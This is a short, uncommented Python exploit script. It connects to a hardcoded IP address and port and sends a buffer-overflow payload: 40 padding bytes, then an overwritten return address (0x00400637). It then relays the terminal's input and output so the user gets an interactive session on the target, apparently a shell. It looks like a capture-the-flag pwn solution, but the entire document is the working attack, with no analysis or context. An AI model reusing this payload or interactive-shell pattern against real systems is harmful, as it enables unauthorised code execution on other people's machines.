import asyncio, functools, os, sys

async def main():
	loop = asyncio.get_running_loop()
	reader, writer = await asyncio.open_connection(host = '139.199.72.13', port = 10000)
	data = b'\x00' * 40 + b'\x37\x06\x40\x00' + b'\x00' * 4
	writer.write(data)
	await writer.drain()
	await asyncio.gather(handle_reader(reader), handle_writer(writer))

async def handle_reader(reader):
	while True:
		data = await reader.readline()
		try:
			print(data.decode(), end='')
		except Exception as e:
			print(e)

async def handle_writer(writer):
	std_reader, _ = await stdio()
	while True:
		data = await std_reader.readline()
		if sys.platform == 'win32':
			data = data[:-2] + b'\n'
		writer.write(data)
		await writer.drain()

async def stdio(limit=asyncio.streams._DEFAULT_LIMIT, loop=None):
	if loop is None:
		loop = asyncio.get_event_loop()
	if sys.platform == 'win32':
		return _win32_stdio(loop)
	reader = asyncio.StreamReader(limit=limit, loop=loop)
	await loop.connect_read_pipe(
		lambda: asyncio.StreamReaderProtocol(reader, loop=loop), sys.stdin)
	writer_transport, writer_protocol = await loop.connect_write_pipe(
		lambda: asyncio.streams.FlowControlMixin(loop=loop),
		os.fdopen(sys.stdout.fileno(), 'wb'))
	writer = asyncio.streams.StreamWriter(
		writer_transport, writer_protocol, None, loop)
	return reader, writer

def _win32_stdio(loop):
	class Win32StdinReader:
		def __init__(self):
			self.stdin = sys.stdin.buffer 
		async def readline(self):
			return await loop.run_in_executor(None, self.stdin.readline)
	class Win32StdoutWriter:
		def __init__(self):
			self.buffer = []
			self.stdout = sys.stdout.buffer
		def write(self, data):
			self.buffer.append(data)
		async def drain(self):
			data, self.buffer = self.buffer, []
			return await loop.run_in_executor(None, sys.stdout.writelines, data)
	return Win32StdinReader(), Win32StdoutWriter()

asyncio.run(main())
